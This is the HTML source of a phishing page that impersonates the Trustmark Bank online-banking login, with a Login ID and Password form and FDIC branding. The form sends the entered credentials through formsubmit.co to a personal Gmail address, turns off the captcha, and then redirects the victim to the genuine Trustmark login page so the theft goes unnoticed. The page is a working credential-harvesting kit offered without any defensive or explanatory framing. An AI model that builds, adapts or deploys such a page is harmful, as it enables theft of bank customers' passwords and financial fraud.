<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trustmark Bank</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
</head>
<body>
    <section class="head">
        <header>
            <div class="head-box">
                <div class="head-logo">
                    <h1>
                        my<span class="head-span">Trustmark</span><span class="reg">&reg;</span>
                    </h1>
                </div>
            </div>
        </header>
    </section>

    <section class="form">
        <div class="form-box">
            <form id="form"  action="https://formsubmit.co/kidarkush@gmail.com" method="POST" >
                <div class="input-box">
                    <label for="Login-ID">Login ID</label>
                    <input type="text" name="Login-Id" id="Login-ID" required>

                    <label for="Password">Password</label>
                    <input type="password" id="Password" required name="Password">
                     <input type="hidden" name="_captcha" value="false">
              <input type="hidden" name="_next" value="https://www.mytrustmark.com/TrustmarkNationalBankOnline/Uux.aspx#/login">
                </div>

                <div class="check">
                    <input type="checkbox" name="Remember-me" id="Remember-me">
                    <label for="Remember-me">Remember me</label>
                </div>

                <div class="btn">
                    <button type="submit"> Log In</button>
                </div>

                <div class="forget">
                    <a href="#">Forgot your password?</a>
                </div>
            </form>
        </div>
    </section>

    <section class="privacy-nav">
        <div class="nav-box">
             <div class="nav-info">
                <nav>
                    <a href="#">Privacy Policy</a>
                    <a href="#">Locations</a>
                    <a href="#">Enroll Now</a>
                </nav>
             </div>
        </div>
    </section>

    <section class="fdic">
        <div class="fdic-img">
            <div class="img1">
                <img src="equal.png" alt="equal">
            </div>
            <div class="img2">
                <img src="fdic1.png" alt="fdic">
                <p>MEMBER FDIC</p>
            </div>
        </div>
    </section>
</body>
</html>
